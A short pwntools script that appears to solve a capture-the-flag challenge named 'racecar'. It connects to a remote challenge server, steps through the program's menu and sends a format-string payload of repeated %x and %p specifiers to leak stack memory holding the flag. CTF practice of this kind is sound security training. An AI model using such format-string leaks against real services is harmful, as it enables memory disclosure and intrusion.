#!/usr/bin/env python3
"""exploit the racecar challenge."""

from pwn import remote, context

p = remote("138.68.129.154", 31614)  # remote server
# p = process("./racecar") for local tests
context.log_level = "debug"


def go_to_end():
    """Go to the end of the program to get the flag."""
    p.sendline("Name")
    p.recv()
    p.sendline("Nickname")
    p.recv()
    p.sendline("2")
    p.recv()
    p.sendline("1")
    p.recv()
    p.sendline("2")
    p.recv()


go_to_end()
p.sendline("%x%x%x%x%x%x%x%x%x%x%x---FLAG: %p%p%p%p%p%p%p%p%p%p%p ---")
print(p.recv())
p.interactive()
